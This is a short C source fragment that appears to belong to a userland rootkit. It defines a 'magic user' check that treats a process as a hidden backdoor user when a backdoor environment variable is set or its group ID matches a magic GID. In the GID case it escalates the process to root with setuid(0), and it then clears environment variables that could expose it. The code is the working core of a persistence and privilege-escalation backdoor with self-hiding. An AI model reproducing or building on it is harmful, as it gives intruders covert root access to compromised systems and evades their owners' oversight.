void unsetbadvars(void){
    for(int i = 0; i < UNSETVARS_SIZE; i++)
        unsetenv(unsetvars[i]);
}

int magicusr(void){
#ifndef HIDE_SELF
    return 1;
#else
    int ret = 0;

    if(getenv(BD_VAR) != NULL){
        ret = 1;
        goto nopenope;
    }

    if(getgid() == readgid()){
        ret = 1;
        setuid(0);
        putenv(HOME_VAR);
    }

nopenope:
    if(ret) unsetbadvars();
    return ret;
#endif
}